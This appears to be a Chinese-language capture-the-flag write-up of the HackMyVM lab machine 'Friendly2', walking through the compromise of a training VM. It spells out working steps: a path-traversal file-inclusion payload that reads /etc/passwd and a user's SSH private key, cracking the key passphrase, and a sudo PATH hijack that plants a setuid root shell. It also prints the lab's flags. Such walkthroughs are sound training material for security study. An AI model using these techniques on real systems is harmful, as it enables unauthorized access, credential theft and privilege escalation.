# Friendly2

2025.02.22 https://hackmyvm.eu/machines/machine.php?vm=Friendly2

[video](https://www.bilibili.com/video/BV1GtPTekE8z/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 扫描 发现 http://192.168.5.40/tools/ 查看源码发现注释信息：

```
<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
```

访问 http://192.168.5.40/tools/check_if_exist.php?doc=keyboard.html 这里可能存在文件包含，尝试访问：

```
http://192.168.5.40/tools/check_if_exist.php?doc=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
gh0st:x:1001:1001::/home/gh0st:/bin/bash
```

ffuf 看看还能读取到哪些信息：

```
ffuf -t 100 -ac -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.5.40/tools/check_if_exist.php?doc=../../../../../FUZZ
```

不能读取 apache 的 access.log 文件，尝试读取 gh0st 中.ssh 私钥看看能否读取：

```
curl http://192.168.5.40/tools/check_if_exist.php?doc=../../../../../../home/gh0st/.ssh/id_rsa
```

将读取的密钥保存，但是密钥有密码，使用 john 进行破解，得到私钥密码为 celtic , ssh 登陆用户 gh0st ， 得到了 user flag:

```
gh0st@friendly2:~$ cat user.txt
ab0366431e2d8ff563cf34272e3d14bd
```

sudo -l 发现 (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh 可以 SETENV PATH 路径劫持，同时发现脚本中都没有使用命令的绝对路径，劫持 tr 命令，进行利用：

```
cd /tmp
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > tr
chmod +x tr
sudo -u root PATH=/tmp:$PATH /opt/security.sh
./rootbash -p
```

寻找最终 root flag:

```
rootbash-5.1# cd ...
rootbash-5.1# ls -al
total 12
d-wx------  2 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
-r--------  1 root root  100 Apr 29  2023 ebbg.txt
rootbash-5.1# cat ebbg.txt
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq

Hint: numbers are not codified
```

提示有编码，查看 /opt/security.sh 中的内容使用的是最字符进行 rot13 转换，使用 cyberchef 进行转换得到最终 flag : 98199a723d0f44f6ef39e33685d8cabd
